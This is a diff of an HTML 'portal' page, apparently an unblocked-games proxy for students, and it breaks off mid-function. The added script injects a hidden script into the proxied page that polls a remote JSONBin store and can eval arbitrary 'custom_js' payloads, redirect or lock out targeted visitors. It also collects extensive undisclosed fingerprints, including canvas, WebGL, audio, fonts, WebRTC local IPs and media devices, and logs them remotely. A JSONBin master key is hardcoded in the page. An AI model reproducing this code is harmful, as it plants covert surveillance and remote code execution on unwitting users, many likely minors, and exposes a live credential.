@@ -1,129 +1,1389 @@
-<!doctype html>
+<!DOCTYPE html>
 <html lang="en">
-  <head>
-    <meta charset="UTF-8" />
-    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>Unblocked Games Hub</title>
-    <script src="https://cdn.tailwindcss.com"></script>
-    <script>
-      tailwind.config = {
-        theme: {
-          extend: {
-            fontFamily: {
-              sans: ['Inter', 'ui-sans-serif', 'system-ui', 'sans-serif'],
-            },
-          },
-        },
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>8080DEV | Portal</title>
+
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&amp;display=swap" rel="stylesheet">
+
+<style>
+:root {
+  --primary: #6366f1;
+  --primary-soft: rgba(99, 102, 241, 0.25);
+  --accent: #22d3ee;
+  --accent-soft: rgba(34, 211, 238, 0.2);
+  --bg-dark: #09090b;
+  --bg-card: rgba(24, 24, 27, 0.8);
+  --glass: rgba(255, 255, 255, 0.03);
+  --border: rgba(255, 255, 255, 0.08);
+  --text: #fafafa;
+  --text-muted: #71717a;
+}
+
+* { margin: 0; padding: 0; box-sizing: border-box; }
+
+body {
+  background: var(--bg-dark);
+  min-height: 100vh;
+  display: flex;
+  justify-content: center;
+  align-items: center;
+  font-family: "Inter", -apple-system, BlinkMacSystemFont, sans-serif;
+  color: var(--text);
+  position: relative;
+  overflow: hidden;
+}
+
+/* Animated gradient background */
+.gradient-bg {
+  position: fixed;
+  width: 100%;
+  height: 100%;
+  z-index: 0;
+  overflow: hidden;
+}
+
+.gradient-orb {
+  position: absolute;
+  border-radius: 50%;
+  filter: blur(80px);
+  opacity: 0.5;
+  animation: float 20s ease-in-out infinite;
+}
+
+.orb-1 {
+  width: 600px;
+  height: 600px;
+  background: var(--primary-soft);
+  top: -200px;
+  left: -100px;
+  animation-delay: 0s;
+}
+
+.orb-2 {
+  width: 500px;
+  height: 500px;
+  background: var(--accent-soft);
+  bottom: -150px;
+  right: -100px;
+  animation-delay: -10s;
+}
+
+.orb-3 {
+  width: 400px;
+  height: 400px;
+  background: rgba(168, 85, 247, 0.15);
+  top: 50%;
+  left: 50%;
+  transform: translate(-50%, -50%);
+  animation-delay: -5s;
+}
+
+@keyframes float {
+  0%, 100% { transform: translate(0, 0) scale(1); }
+  25% { transform: translate(30px, -30px) scale(1.05); }
+  50% { transform: translate(-20px, 20px) scale(0.95); }
+  75% { transform: translate(20px, 10px) scale(1.02); }
+}
+
+/* Grid pattern overlay */
+.grid-pattern {
+  position: fixed;
+  width: 100%;
+  height: 100%;
+  z-index: 1;
+  background-image: 
+    linear-gradient(rgba(255,255,255,0.02) 1px, transparent 1px),
+    linear-gradient(90deg, rgba(255,255,255,0.02) 1px, transparent 1px);
+  background-size: 60px 60px;
+  pointer-events: none;
+}
+
+/* Card container */
+.container {
+  z-index: 10;
+  text-align: center;
+  padding: 48px;
+  background: var(--bg-card);
+  border: 1px solid var(--border);
+  border-radius: 24px;
+  backdrop-filter: blur(20px);
+  width: min(90%, 440px);
+  box-shadow: 
+    0 0 0 1px rgba(255,255,255,0.05),
+    0 20px 50px -12px rgba(0,0,0,0.5),
+    0 0 100px -20px var(--primary-soft);
+}
+
+/* Logo/title */
+h1 {
+  font-size: 36px;
+  font-weight: 700;
+  margin-bottom: 8px;
+  letter-spacing: -0.02em;
+  background: linear-gradient(135deg, var(--text) 0%, var(--accent) 50%, var(--primary) 100%);
+  -webkit-background-clip: text;
+  -webkit-text-fill-color: transparent;
+  background-clip: text;
+}
+
+.subtitle {
+  font-size: 14px;
+  color: var(--text-muted);
+  margin-bottom: 32px;
+  font-weight: 400;
+}
+
+/* Button row */
+.button-row {
+  display: flex;
+  justify-content: center;
+  align-items: center;
+  gap: 12px;
+}
+
+/* Main button */
+.button {
+  padding: 14px 32px;
+  font-size: 15px;
+  font-weight: 600;
+  color: white;
+  background: linear-gradient(135deg, var(--primary) 0%, #8b5cf6 100%);
+  border: none;
+  border-radius: 12px;
+  cursor: pointer;
+  transition: all 0.2s ease;
+  display: none;
+  position: relative;
+  overflow: hidden;
+}
+
+.button::before {
+  content: '';
+  position: absolute;
+  inset: 0;
+  background: linear-gradient(135deg, rgba(255,255,255,0.2) 0%, transparent 50%);
+  opacity: 0;
+  transition: opacity 0.2s;
+}
+
+.button:hover {
+  transform: translateY(-2px);
+  box-shadow: 0 10px 40px -10px var(--primary);
+}
+
+.button:hover::before {
+  opacity: 1;
+}
+
+.button:active {
+  transform: translateY(0);
+}
+
+.button.visible {
+  display: inline-flex;
+  align-items: center;
+  gap: 8px;
+}
+
+/* TOS button */
+.tos-btn {
+  width: 48px;
+  height: 48px;
+  border-radius: 12px;
+  background: var(--glass);
+  border: 1px solid var(--border);
+  color: var(--text-muted);
+  font-size: 20px;
+  cursor: pointer;
+  transition: all 0.2s ease;
+  display: none;
+  align-items: center;
+  justify-content: center;
+}
+
+.tos-btn.visible {
+  display: flex;
+}
+
+.tos-btn:hover {
+  background: rgba(255,255,255,0.08);
+  color: var(--text);
+  border-color: rgba(255,255,255,0.15);
+}
+
+/* Status text */
+#status {
+  margin-top: 20px;
+  font-size: 13px;
+  color: var(--text-muted);
+  min-height: 20px;
+}
+
+/* Loading text */
+.loading-text {
+  color: var(--text-muted);
+  font-size: 14px;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  gap: 8px;
+}
+
+.loading-text::before {
+  content: '';
+  width: 16px;
+  height: 16px;
+  border: 2px solid var(--border);
+  border-top-color: var(--primary);
+  border-radius: 50%;
+  animation: spin 0.8s linear infinite;
+}
+
+@keyframes spin {
+  to { transform: rotate(360deg); }
+}
+
+/* Site notice banner - KEEPING ORANGE AS REQUESTED */
+.site-notice {
+  position: fixed;
+  top: 0;
+  left: 0;
+  right: 0;
+  background: #f39c12;
+  color: #000;
+  padding: 12px 20px;
+  font-weight: 600;
+  font-size: 14px;
+  text-align: center;
+  z-index: 9999;
+  display: none;
+  box-shadow: 0 2px 10px rgba(0,0,0,0.3);
+}
+
+.site-notice.visible {
+  display: block;
+}
+
+.site-notice-close {
+  position: absolute;
+  right: 15px;
+  top: 50%;
+  transform: translateY(-50%);
+  background: rgba(0,0,0,0.2);
+  border: none;
+  color: #000;
+  font-size: 18px;
+  cursor: pointer;
+  width: 24px;
+  height: 24px;
+  border-radius: 50%;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  line-height: 1;
+}
+
+.site-notice-close:hover {
+  background: rgba(0,0,0,0.3);
+}
+
+/* TOS Modal */
+.tos-modal-overlay {
+  position: fixed;
+  top: 0;
+  left: 0;
+  right: 0;
+  bottom: 0;
+  background: rgba(0, 0, 0, 0.9);
+  z-index: 10000;
+  display: none;
+  justify-content: center;
+  align-items: center;
+  padding: 20px;
+  backdrop-filter: blur(8px);
+}
+
+.tos-modal-overlay.visible {
+  display: flex;
+}
+
+.tos-modal {
+  max-width: 700px;
+  max-height: 85vh;
+  background: #18181b;
+  border-radius: 20px;
+  padding: 32px;
+  color: var(--text);
+  font-family: inherit;
+  line-height: 1.7;
+  overflow-y: auto;
+  position: relative;
+  border: 1px solid var(--border);
+}
+
+.tos-modal h1 {
+  text-align: center;
+  color: #ef4444;
+  font-size: 1.5rem;
+  margin-bottom: 24px;
+  background: none;
+  -webkit-background-clip: unset;
+  -webkit-text-fill-color: #ef4444;
+}
+
+.tos-modal p {
+  margin-bottom: 14px;
+  color: #a1a1aa;
+}
+
+.tos-modal strong {
+  color: var(--text);
+}
+
+.tos-modal ul {
+  margin-left: 24px;
+  margin-bottom: 14px;
+}
+
+.tos-modal li {
+  margin-bottom: 8px;
+  color: #a1a1aa;
+}
+
+.tos-modal .highlight {
+  color: #fbbf24;
+  font-weight: 600;
+  text-align: center;
+  margin: 32px 0;
+  padding: 20px;
+  background: rgba(251, 191, 36, 0.1);
+  border-radius: 12px;
+  border: 1px solid rgba(251, 191, 36, 0.2);
+}
+
+.tos-modal .footer-note {
+  text-align: center;
+  color: #52525b;
+  margin-top: 32px;
+  font-size: 0.9em;
+}
+
+.tos-close-btn {
+  position: absolute;
+  top: 16px;
+  right: 16px;
+  width: 36px;
+  height: 36px;
+  border-radius: 10px;
+  background: rgba(255, 255, 255, 0.05);
+  border: 1px solid var(--border);
+  color: var(--text-muted);
+  font-size: 20px;
+  cursor: pointer;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  transition: all 0.2s;
+}
+
+.tos-close-btn:hover {
+  background: rgba(239, 68, 68, 0.2);
+  color: #ef4444;
+  border-color: rgba(239, 68, 68, 0.3);
+}
+</style>
+</head>
+
+<body>
+
+<!-- Site Notice Banner -->
+<div class="site-notice" id="siteNotice">
+  <span id="siteNoticeText"></span>
+  <button class="site-notice-close" onclick="closeNotice()">&times;</button>
+</div>
+
+<!-- Animated background -->
+<div class="gradient-bg">
+  <div class="gradient-orb orb-1"></div>
+  <div class="gradient-orb orb-2"></div>
+  <div class="gradient-orb orb-3"></div>
+</div>
+<div class="grid-pattern"></div>
+
+<div class="container">
+  <h1>8080DEV</h1>
+  <p class="subtitle">Secure access portal</p>
+
+  <p id="loading-status" class="loading-text">Verifying access</p>
+
+  <div class="button-row">
+    <button class="tos-btn" id="tosBtn" onclick="openTOS()" title="Terms of Service">
+      <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+        <path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"></path>
+        <polyline points="14 2 14 8 20 8"></polyline>
+        <line x1="16" y1="13" x2="8" y2="13"></line>
+        <line x1="16" y1="17" x2="8" y2="17"></line>
+        <polyline points="10 9 9 9 8 9"></polyline>
+      </svg>
+    </button>
+    
+    <button class="button" onclick="openSite()">
+      <svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+        <path d="M15 3h4a2 2 0 0 1 2 2v14a2 2 0 0 1-2 2h-4"/>
+        <polyline points="10 17 15 12 10 7"/>
+        <line x1="15" y1="12" x2="3" y2="12"/>
+      </svg>
+      Enter
+    </button>
+  </div>
+
+  <p id="status"></p>
+</div>
+
+<!-- TOS Modal -->
+<div class="tos-modal-overlay" id="tosModal" onclick="if(event.target === this) closeTOS()">
+  <div class="tos-modal">
+    <button class="tos-close-btn" onclick="closeTOS()">&times;</button>
+    
+    <h1>IMPORTANT DISCLAIMER & TERMS OF USE</h1>
+    
+    <p><strong>Last updated: January 2026</strong></p>
+    
+    <p><strong>READ THIS BEFORE USING THE SITE</strong></p>
+    
+    <p>1. This website is <strong>NOT</strong> made for use at school.</p>
+    
+    <p>2. I (the person who made this site) <strong>strongly advise you NOT to use this website while at school</strong>, during school hours, on school Wi-Fi, or on school-issued devices.</p>
+    
+    <p>3. If you choose to access or use this website at school anyway, <strong>that is 100% your own decision and your own risk</strong>.</p>
+    
+    <p>4. <strong>YOU</strong> are solely responsible for:</p>
+    <ul>
+      <li>Knowing and following your school's rules about internet use</li>
+      <li>Any consequences from teachers, administrators, parents, or the school district</li>
+      <li>Any disciplinary action, detention, suspension, device confiscation, or other punishment</li>
+      <li>Any damage to your school account, grades, or reputation</li>
+    </ul>
+    
+    <p>5. The creator of this website:</p>
+    <ul>
+      <li>Does NOT encourage or authorize use of this site at school</li>
+      <li>Does NOT accept any responsibility or liability for your actions</li>
+      <li>Will NOT help you if you get in trouble</li>
+      <li>May remove the site or block access at any time without warning</li>
+    </ul>
+    
+    <p class="highlight">
+      BY USING THIS WEBSITE YOU AGREE THAT:<br>
+      YOU USE IT AT YOUR OWN RISK.<br>
+      THE CREATOR IS NOT RESPONSIBLE FOR ANY CONSEQUENCES.<br>
+      YOU WILL NOT BLAME THE CREATOR IF YOU GET IN TROUBLE.
+    </p>
+    
+    <p class="footer-note">
+      If your school blocks this site eventually...<br>
+      please remember: <strong>I told you so.</strong>
+    </p>
+  </div>
+</div>
+
+<!-- TOS Modal Functions -->
+<script>
+function openTOS() {
+  document.getElementById('tosModal').classList.add('visible');
+}
+
+function closeTOS() {
+  document.getElementById('tosModal').classList.remove('visible');
+}
+
+  document.addEventListener('keydown', (e) => {
+  if (e.key === 'Escape') closeTOS();
+  });
+  </script>
+
+<!-- Full logging, HWID fingerprinting, and banning system -->
+<script>
+(function checkIPBlacklist() {
+  const BLOCKED_IPS = [];
+  const BLOCKED_HWIDS = [];
+
+  const JSONBIN_API_KEY = '$2a$10$XjpP.ObzW6eYdScRHoXWl.zJ0CmA.eyPrvKMXhRxWH54mLcFQP9f2';
+    const JSONBIN_LOGS_BIN = '696bab1aae596e708fe2e476';
+    const JSONBIN_BANS_BIN = '696bab45d0ea881f407264cb';
+
+  const DISCORD_WEBHOOK_URL = 'YOUR_DISCORD_WEBHOOK_URL_HERE';
+
+  // Open site function - must be defined after JSONBIN variables
+  window.openSite = function() {
+    const status = document.getElementById('status');
+    status.textContent = 'Connecting...';
+    
+    fetch('https://cdn.jsdelivr.net/gh/unlocker129/CAPROXY@main/autoupdate.html?t=' + Date.now())
+      .then(function(r) { return r.text(); })
+      .then(function(html) {
+        const win = window.open('about:blank', '_blank');
+        if (win) {
+          // Build the live commands script with actual values
+          const liveCommandsScript = '<scr' + 'ipt>' +
+            '(function(){' +
+            'var API_KEY="' + JSONBIN_API_KEY + '";' +
+            'var BANS_BIN="' + JSONBIN_BANS_BIN + '";' +
+            'var hwid=localStorage.getItem("8080_HWID")||"Unknown";' +
+            'var ip=sessionStorage.getItem("8080_visitor_ip")||"Unknown";' +
+            'async function check(){' +
+            'try{' +
+            'if(ip==="Unknown"){try{var r=await fetch("https://api.ipify.org?format=json");if(r.ok){var d=await r.json();ip=d.ip||"Unknown";sessionStorage.setItem("8080_visitor_ip",ip);}}catch(e){}}' +
+            'var res=await fetch("https://api.jsonbin.io/v3/b/"+BANS_BIN+"/latest",{headers:{"X-Master-Key":API_KEY}});' +
+            'if(!res.ok)return;' +
+            'var data=await res.json();' +
+            'var ctrl=data.record&&data.record.liveControls||{};' +
+            'if(ctrl.killSwitch){document.body.innerHTML="<div style=\\"display:flex;flex-direction:column;align-items:center;justify-content:center;min-height:100vh;background:#09090b;color:#fff;font-family:system-ui;text-align:center;\\"><h1 style=\\"font-size:6rem;\\">404</h1><p style=\\"color:#666;\\">Not found</p></div>";return;}' +
+            'if(ctrl.redirect&&ctrl.redirectUrl){window.location.href=ctrl.redirectUrl;return;}' +
+            'if(ctrl.maintenance){document.body.innerHTML="<div style=\\"display:flex;flex-direction:column;align-items:center;justify-content:center;min-height:100vh;background:#09090b;color:#fff;font-family:system-ui;text-align:center;\\"><h1 style=\\"font-size:2rem;color:#f39c12;\\">Maintenance</h1><p style=\\"color:#666;\\">"+(ctrl.maintenanceMessage||"Check back soon")+"</p></div>";return;}' +
+            'var cmds=data.record&&data.record.liveCommands||[];' +
+            'var now=new Date();' +
+            'for(var i=0;i<cmds.length;i++){' +
+            'var c=cmds[i];' +
+            'var isTarget=c.targetType==="all"||(c.targetType==="ip"&&c.targetValue===ip)||(c.targetType==="hwid"&&c.targetValue===hwid);' +
+            'var isActive=new Date(c.expiresAt)>now;' +
+            'var done=sessionStorage.getItem("cmd_"+c.id);' +
+            'if(isTarget&&isActive&&!done){' +
+            'sessionStorage.setItem("cmd_"+c.id,"1");' +
+            'if(c.command==="popup")alert(c.payload);' +
+            'else if(c.command==="redirect")window.location.href=c.payload;' +
+            'else if(c.command==="refresh")window.location.reload();' +
+            'else if(c.command==="disconnect")document.body.innerHTML="<div style=\\"display:flex;flex-direction:column;align-items:center;justify-content:center;min-height:100vh;background:#09090b;color:#fff;font-family:system-ui;text-align:center;\\"><h1 style=\\"color:#f44;\\">Access Denied</h1></div>";' +
+            'else if(c.command==="custom_js")try{eval(c.payload);}catch(e){}' +
+            '}' +
+            '}' +
+            '}catch(e){}' +
+            '}' +
+            'check();setInterval(check,5000);' +
+            '})();' +
+            '</scr' + 'ipt>';
+          
+          // Inject before </body> or </html> or at end
+          var modifiedHtml = html;
+          if (html.indexOf('</body>') !== -1) {
+            modifiedHtml = html.replace('</body>', liveCommandsScript + '</body>');
+          } else if (html.indexOf('</html>') !== -1) {
+            modifiedHtml = html.replace('</html>', liveCommandsScript + '</html>');
+          } else {
+            modifiedHtml = html + liveCommandsScript;
+          }
+          
+          win.document.open();
+          win.document.write(modifiedHtml);
+          win.document.close();
+          status.textContent = 'Connected';
+          setTimeout(function() { status.textContent = ''; }, 2000);
+        } else {
+          status.textContent = 'Popup blocked - enable popups';
+        }
+      })
+      .catch(function(err) {
+        console.log('[v0] openSite error:', err);
+        status.textContent = 'Connection failed';
+      });
+  };
+
+  let lastNoticeMessage = '';
+  let lastNoticeEnabled = false;
+  
+  async function fetchSiteNotice() {
+    try {
+      if (!JSONBIN_API_KEY || JSONBIN_API_KEY === 'YOUR_JSONBIN_API_KEY_HERE') return;
+      
+      const response = await fetch(`https://api.jsonbin.io/v3/b/${JSONBIN_BANS_BIN}/latest?t=${Date.now()}`, {
+        headers: { 'X-Master-Key': JSONBIN_API_KEY },
+        cache: 'no-store'
+      });
+      
+      if (response.ok) {
+        const data = await response.json();
+        const notice = data.record?.notice;
+        
+        const noticeEl = document.getElementById('siteNotice');
+        const noticeText = document.getElementById('siteNoticeText');
+        
+        if (notice && notice.enabled && notice.message) {
+          if (notice.message !== lastNoticeMessage || notice.enabled !== lastNoticeEnabled) {
+            lastNoticeMessage = notice.message;
+            lastNoticeEnabled = notice.enabled;
+            if (noticeEl && noticeText) {
+              noticeText.textContent = notice.message;
+              noticeEl.classList.add('visible');
+              if (sessionStorage.getItem('noticeClosed') && notice.message !== sessionStorage.getItem('lastClosedNotice')) {
+                sessionStorage.removeItem('noticeClosed');
+              }
+            }
+          }
+        } else {
+          if (lastNoticeEnabled !== false) {
+            lastNoticeEnabled = false;
+            lastNoticeMessage = '';
+            if (noticeEl) {
+              noticeEl.classList.remove('visible');
+            }
+          }
+        }
       }
-    </script>
-    <link rel="stylesheet" href="./src/index.css">
-  </head>
-  <body class="min-h-screen bg-[#f5f5f5] text-zinc-900 font-sans flex flex-col">
-    <!-- Header -->
-    <header class="sticky top-0 z-40 bg-white/80 backdrop-blur-md border-b border-zinc-200">
-      <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 h-16 flex items-center justify-between">
-        <div class="flex items-center gap-2">
-          <div class="bg-zinc-900 p-1.5 rounded-lg">
-            <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="w-6 h-6 text-white"><line x1="6" x2="10" y1="12" y2="12"></line><line x1="8" x2="8" y1="10" y2="14"></line><line x1="15" x2="15.01" y1="13" y2="13"></line><line x1="18" x2="18.01" y1="11" y2="11"></line><rect width="20" height="12" x="2" y="6" rx="2"></rect></svg>
+    } catch (err) {
+      console.log('Failed to fetch site notice:', err);
+    }
+  }
+  
+  window.closeNotice = function() {
+    const noticeEl = document.getElementById('siteNotice');
+    if (noticeEl) {
+      noticeEl.classList.remove('visible');
+      sessionStorage.setItem('noticeClosed', 'true');
+      sessionStorage.setItem('lastClosedNotice', lastNoticeMessage);
+    }
+  };
+  
+  if (!sessionStorage.getItem('noticeClosed')) {
+    fetchSiteNotice();
+  }
+  
+  setInterval(() => {
+    if (!sessionStorage.getItem('noticeClosed')) {
+      fetchSiteNotice();
+    }
+  }, 10000);
+
+  async function getLiveBans() {
+  try {
+  if (!JSONBIN_API_KEY || JSONBIN_API_KEY === 'YOUR_JSONBIN_API_KEY_HERE') {
+  return { ips: BLOCKED_IPS, hwids: BLOCKED_HWIDS, liveControls: {}, tempBans: [] };
+  }
+  const response = await fetch(`https://api.jsonbin.io/v3/b/${JSONBIN_BANS_BIN}/latest`, {
+  headers: { 'X-Master-Key': JSONBIN_API_KEY }
+  });
+  if (response.ok) {
+  const data = await response.json();
+  const now = new Date();
+  
+  // Filter active temp bans (not expired)
+  const tempBans = (data.record?.tempBans || []).filter(ban => new Date(ban.expiresAt) > now);
+  const tempBannedIPs = tempBans.filter(b => b.type === 'ip').map(b => b.value);
+  const tempBannedHWIDs = tempBans.filter(b => b.type === 'hwid').map(b => b.value);
+  
+  return {
+  ips: [...new Set([...BLOCKED_IPS, ...(data.record?.ips || []), ...tempBannedIPs])],
+  hwids: [...new Set([...BLOCKED_HWIDS, ...(data.record?.hwids || []), ...tempBannedHWIDs])],
+  liveControls: data.record?.liveControls || {},
+  tempBans: tempBans
+  };
+  }
+  } catch (err) {
+  console.log('JSONBin bans fetch failed, using hardcoded list:', err);
+  }
+  return { ips: BLOCKED_IPS, hwids: BLOCKED_HWIDS, liveControls: {}, tempBans: [] };
+  }
+  
+  async function logToJSONBin(visitorData) {
+    try {
+      if (!JSONBIN_API_KEY || JSONBIN_API_KEY === 'YOUR_JSONBIN_API_KEY_HERE') {
+        console.log('JSONBin not configured, skipping log');
+        return;
+      }
+      
+      const getResponse = await fetch(`https://api.jsonbin.io/v3/b/${JSONBIN_LOGS_BIN}/latest`, {
+        headers: { 'X-Master-Key': JSONBIN_API_KEY }
+      });
+      
+      let logs = [];
+      if (getResponse.ok) {
+        const data = await getResponse.json();
+        logs = Array.isArray(data.record) ? data.record : [];
+      }
+      
+      logs.push(visitorData);
+      if (logs.length > 500) {
+        logs = logs.slice(-500);
+      }
+      
+      await fetch(`https://api.jsonbin.io/v3/b/${JSONBIN_LOGS_BIN}`, {
+        method: 'PUT',
+        headers: {
+          'Content-Type': 'application/json',
+          'X-Master-Key': JSONBIN_API_KEY
+        },
+        body: JSON.stringify(logs)
+      });
+      
+      console.log('Visitor logged to JSONBin');
+    } catch (err) {
+      console.log('JSONBin log failed:', err);
+    }
+  }
+  
+  async function generateHWID() {
+    const components = [];
+    
+    components.push(navigator.userAgent);
+    components.push(navigator.language);
+    components.push(navigator.platform);
+    components.push(screen.width + 'x' + screen.height);
+    components.push(screen.colorDepth);
+    components.push(window.devicePixelRatio);
+    components.push(new Date().getTimezoneOffset());
+    components.push(navigator.hardwareConcurrency || 0);
+    components.push(navigator.deviceMemory || 0);
+    components.push(navigator.maxTouchPoints || 0);
+    
+    try {
+      const canvas = document.createElement('canvas');
+      canvas.width = 200;
+      canvas.height = 50;
+      const ctx = canvas.getContext('2d');
+      ctx.textBaseline = 'top';
+      ctx.font = '14px Arial';
+      ctx.fillStyle = '#f60';
+      ctx.fillRect(125, 1, 62, 20);
+      ctx.fillStyle = '#069';
+      ctx.fillText('8080DEV,HWID', 2, 15);
+      ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
+      ctx.fillText('8080DEV,HWID', 4, 17);
+      components.push(canvas.toDataURL());
+    } catch (e) {
+      components.push('canvas-error');
+    }
+    
+    try {
+      const canvas = document.createElement('canvas');
+      const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+      if (gl) {
+        const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+        if (debugInfo) {
+          components.push(gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL));
+          components.push(gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL));
+        }
+      }
+    } catch (e) {
+      components.push('webgl-error');
+    }
+    
+    try {
+      const audioContext = new (window.AudioContext || window.webkitAudioContext)();
+      const oscillator = audioContext.createOscillator();
+      const analyser = audioContext.createAnalyser();
+      const gain = audioContext.createGain();
+      const processor = audioContext.createScriptProcessor(4096, 1, 1);
+      
+      oscillator.type = 'triangle';
+      oscillator.frequency.setValueAtTime(10000, audioContext.currentTime);
+      
+      gain.gain.setValueAtTime(0, audioContext.currentTime);
+      oscillator.connect(analyser);
+      analyser.connect(processor);
+      processor.connect(gain);
+      gain.connect(audioContext.destination);
+      
+      oscillator.start(0);
+      
+      const bins = new Float32Array(analyser.frequencyBinCount);
+      analyser.getFloatFrequencyData(bins);
+      
+      let audioSum = 0;
+      for (let i = 0; i < bins.length; i++) {
+        audioSum += Math.abs(bins[i]);
+      }
+      components.push(audioSum.toString());
+      
+      oscillator.stop();
+      audioContext.close();
+    } catch (e) {
+      components.push('audio-error');
+    }
+    
+    try {
+      const plugins = [];
+      for (let i = 0; i < navigator.plugins.length; i++) {
+        plugins.push(navigator.plugins[i].name);
+      }
+      components.push(plugins.sort().join(','));
+    } catch (e) {
+      components.push('plugins-error');
+    }
+    
+    const str = components.join('|||');
+    let hash = 0;
+    for (let i = 0; i < str.length; i++) {
+      const char = str.charCodeAt(i);
+      hash = ((hash << 5) - hash) + char;
+      hash = hash & hash;
+    }
+    
+    const hwid = 'HWID-' + Math.abs(hash).toString(16).toUpperCase().padStart(8, '0') + '-' + 
+                 Date.now().toString(16).toUpperCase().slice(-8);
+    
+    const storedHWID = localStorage.getItem('8080DEV_HWID');
+    if (storedHWID) {
+      return storedHWID;
+    }
+    localStorage.setItem('8080DEV_HWID', hwid);
+    return hwid;
+  }
+  
+  function getCanvasFingerprint() {
+    try {
+      const canvas = document.createElement('canvas');
+      canvas.width = 200;
+      canvas.height = 50;
+      const ctx = canvas.getContext('2d');
+      ctx.textBaseline = 'top';
+      ctx.font = '14px Arial';
+      ctx.fillStyle = '#f60';
+      ctx.fillRect(125, 1, 62, 20);
+      ctx.fillStyle = '#069';
+      ctx.fillText('8080DEV,fingerprint', 2, 15);
+      ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
+      ctx.fillText('8080DEV,fingerprint', 4, 17);
+      
+      const dataUrl = canvas.toDataURL();
+      let hash = 0;
+      for (let i = 0; i < dataUrl.length; i++) {
+        hash = ((hash << 5) - hash) + dataUrl.charCodeAt(i);
+        hash = hash & hash;
+      }
+      return Math.abs(hash).toString(16).toUpperCase();
+    } catch (e) {
+      return 'Error';
+    }
+  }
+  
+  async function getWebRTCIPs() {
+    return new Promise((resolve) => {
+      const ips = [];
+      try {
+        const pc = new RTCPeerConnection({ iceServers: [] });
+        pc.createDataChannel('');
+        pc.createOffer().then(offer => pc.setLocalDescription(offer));
+        
+        pc.onicecandidate = (event) => {
+          if (!event || !event.candidate) {
+            pc.close();
+            resolve([...new Set(ips)]);
+            return;
+          }
+          const parts = event.candidate.candidate.split(' ');
+          const ip = parts[4];
+          if (ip && !ip.includes(':') && ip !== '0.0.0.0') {
+            ips.push(ip);
+          }
+        };
+        
+        setTimeout(() => {
+          pc.close();
+          resolve([...new Set(ips)]);
+        }, 1000);
+      } catch (e) {
+        resolve(['Not available']);
+      }
+    });
+  }
+  
+  function getInstalledFonts() {
+    const testFonts = ['Arial', 'Verdana', 'Times New Roman', 'Courier New', 'Georgia', 
+      'Comic Sans MS', 'Impact', 'Trebuchet MS', 'Lucida Console', 'Tahoma',
+      'Palatino Linotype', 'Segoe UI', 'Roboto', 'Open Sans', 'Helvetica'];
+    const detectedFonts = [];
+    
+    const canvas = document.createElement('canvas');
+    const ctx = canvas.getContext('2d');
+    const testText = 'mmmmmmmmmmlli';
+    const baseFont = 'monospace';
+    
+    ctx.font = '72px ' + baseFont;
+    const baseWidth = ctx.measureText(testText).width;
+    
+    for (const font of testFonts) {
+      ctx.font = '72px "' + font + '", ' + baseFont;
+      const width = ctx.measureText(testText).width;
+      if (width !== baseWidth) {
+        detectedFonts.push(font);
+      }
+    }
+    
+    return detectedFonts;
+  }
+  
+  async function getMediaDevices() {
+    try {
+      const devices = await navigator.mediaDevices.enumerateDevices();
+      const cameras = devices.filter(d => d.kind === 'videoinput').length;
+      const mics = devices.filter(d => d.kind === 'audioinput').length;
+      const speakers = devices.filter(d => d.kind === 'audiooutput').length;
+      return { cameras, mics, speakers };
+    } catch (e) {
+      return { cameras: 'Unknown', mics: 'Unknown', speakers: 'Unknown' };
+    }
+  }
+
+  async function getAudioFingerprint() {
+    try {
+      const audioContext = new (window.AudioContext || window.webkitAudioContext)();
+      const oscillator = audioContext.createOscillator();
+      const analyser = audioContext.createAnalyser();
+      const gain = audioContext.createGain();
+      const processor = audioContext.createScriptProcessor(4096, 1, 1);
+      
+      oscillator.type = 'triangle';
+      oscillator.frequency.setValueAtTime(10000, audioContext.currentTime);
+      
+      gain.gain.setValueAtTime(0, audioContext.currentTime);
+      oscillator.connect(analyser);
+      analyser.connect(processor);
+      processor.connect(gain);
+      gain.connect(audioContext.destination);
+      
+      oscillator.start(0);
+      
+      const bins = new Float32Array(analyser.frequencyBinCount);
+      analyser.getFloatFrequencyData(bins);
+      
+      let audioSum = 0;
+      for (let i = 0; i < bins.length; i++) {
+        audioSum += Math.abs(bins[i]);
+      }
+      
+      oscillator.stop();
+      audioContext.close();
+      
+      return Math.abs(Math.round(audioSum)).toString(16).toUpperCase();
+    } catch (e) {
+      return 'Error';
+    }
+  }
+
+  async function logVisitor(ipData, hwid) {
+    const deviceInfo = {
+      memory: navigator.deviceMemory || 'Unknown',
+      cpuCores: navigator.hardwareConcurrency || 'Unknown',
+      touchSupport: 'ontouchstart' in window || navigator.maxTouchPoints > 0,
+      cookiesEnabled: navigator.cookieEnabled,
+      doNotTrack: navigator.doNotTrack === '1' || navigator.doNotTrack === 'yes',
+      online: navigator.onLine,
+      pdfViewerEnabled: navigator.pdfViewerEnabled || false,
+      maxTouchPoints: navigator.maxTouchPoints || 0,
+      historyLength: history.length,
+      javaEnabled: navigator.javaEnabled ? navigator.javaEnabled() : false
+    };
+
+    let gpuInfo = 'Unknown';
+    let gpuVendor = 'Unknown';
+    try {
+      const canvas = document.createElement('canvas');
+      const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+      if (gl) {
+        const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
